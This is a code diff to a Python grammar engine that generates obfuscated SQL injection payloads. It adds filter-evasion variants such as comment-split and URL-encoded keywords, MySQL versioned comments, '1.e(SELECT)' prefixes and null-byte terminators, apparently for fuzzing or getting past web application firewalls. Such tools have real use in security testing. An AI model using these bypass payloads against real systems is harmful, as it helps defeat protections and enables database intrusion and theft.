@@ -13,30 +13,31 @@ class GrammarEngine:
             "WHITESPACE": [
                 " ", "/**/", "/*!*/", "%20", "%0a", "%0d", "%09", 
                 "/*" + "".join(random.choices("abcdef", k=4)) + "*/",
-                " " * random.randint(1, 4)
+                " " * random.randint(1, 4),
+                "%0b", "/**/ /*!*/", "/*!50000 */"
             ],
-            "OR": [" OR ", " || ", " XOR ", " or "],
-            "AND": [" AND ", " && ", " and "],
+            "OR": [" OR ", " || ", " XOR ", " or ", "||(SELECT 1)||", "||(true)||"],
+            "AND": [" AND ", " && ", " and ", "&&(SELECT 1)&&", "&&(true)&&"],
             "SELECT": [
                 "SELECT", "SEL/**/ECT", "S%45LECT", "/*!50000SELECT*/", 
-                "SeLeCt", "(SELECT)", "/*!--+*/SELECT"
+                "SeLeCt", "(SELECT)", "/*!--+*/SELECT", "1.e(SELECT)"
             ],
             "UNION": [
                 "UNION", "UNI/**/ON", "U%4eION", "/*!50000UNION*/", 
-                "UnIoN", "(UNION)", "all union"
+                "UnIoN", "(UNION)", "all union", "1.e(UNION)"
             ],
             "FROM": [
                 "FROM", "FR/**/OM", "F%52OM", "/*!50000FROM*/", 
-                "FrOm", "(FROM)"
+                "FrOm", "(FROM)", "1.e(FROM)"
             ],
             "WHERE": [
                 "WHERE", "WHE/**/RE", "W%48ERE", "/*!50000WHERE*/", 
-                "WhErE", "(WHERE)"
+                "WhErE", "(WHERE)", "1.e(WHERE)"
             ],
-            "EQUALS": ["=", "<=>", " LIKE ", " IN ", " regexp "],
-            "COMMA": [",", "/**/,/**/", "/*!,*/", "%2c"],
-            "COMMENT_START": ["/*", "/*!", "/*!50000"],
-            "COMMENT_END": ["*/"]
+            "EQUALS": ["=", "<=>", " LIKE ", " IN ", " regexp ", "1.e('')="],
+            "COMMA": [",", "/**/,/**/", "/*!,*/", "%2c", " 1.e,1.e "],
+            "COMMENT_START": ["#", "-- ", "--+", "/*", "/*!", "/*!50000", ";%00", "/*!" + str(random.randint(30000, 60000))],
+            "COMMENT_END": ["*/", "\x00", " -- -", " #"]
         }
         
     def expand(self, token, intensity=1):
